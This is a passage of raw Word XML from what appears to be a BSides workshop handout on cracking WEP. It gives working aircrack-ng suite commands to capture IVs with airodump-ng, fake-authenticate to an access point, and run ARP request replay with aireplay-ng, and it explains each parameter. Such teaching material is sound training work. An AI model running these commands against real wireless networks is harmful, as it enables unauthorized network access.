        <w:t xml:space="preserve"> BSIDES is the wireless network name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19502211" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="0012143E" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:hanging="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="878787"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 is the access point MAC address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32379FCC" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="0012143E" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:hanging="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="878787"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wlan0mon</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> is the wireless interface name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A12EEC2" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="002E6DDC" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="335E5A99" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45C67C6B" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="007F2182" w:rsidRDefault="002B0795" w:rsidP="002B0795">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3 - Start </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to capture the IVs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A9FF0BB"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Open another console session to capture the generated IVs. Then enter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14E32A4D" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69DA82D1" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="002D638E" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -c 9 --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>bssid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 -w output wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ED98AA0" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7AA8223E"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1F36AA1F" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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c</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 9 is the channel for the wireless network</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F293C02" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>bssid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 is the access point MAC address. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>This eliminate</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> extraneous traffic.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BEFDCE9" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>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w</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> capture is file name prefix for the file which will contain the IVs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BFABBB8" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>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Pr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> is the interface name.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D008352" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77BAB5D4" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20C9F3B3" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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4 - Use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>aireplay-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to do a fake authentication with the access point</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E96D897" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C000C64"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In order for an access point to accept a packet, the source MAC address must already be associated. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28E85C21" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="752324F1"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To associate with an access point, use fake authentication:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="604D3247" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C8EAA08" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="002D638E" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -1 0 -e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>BSIDES</w:t>
      </w:r>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="581DBF62" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08440193"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33FD1841" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>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-1 means fake authentication</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F9843C4" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>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 xml:space="preserve">0 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>reassociation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> timing in seconds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F6C7AFC" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>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e</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> BSIDES is the wireless network name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FB70C02" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>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a</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 is the access point MAC address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C54893D" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>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h</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:0F:B5:88:AC:82 is our card MAC address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22219AD7" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>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wlan0mon</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> is the wireless interface name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26FFE38C" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="41C92BA1" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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4 - Start </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>aireplay-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> in ARP request replay mode</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D9B9B0D"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Open another console session and enter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35981A37" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27327750" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -3 -b 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56180EE7" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7400A1C3" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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You should also start </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> to capture replies.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="574A9A9E" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="641A8513" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="008E353E" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
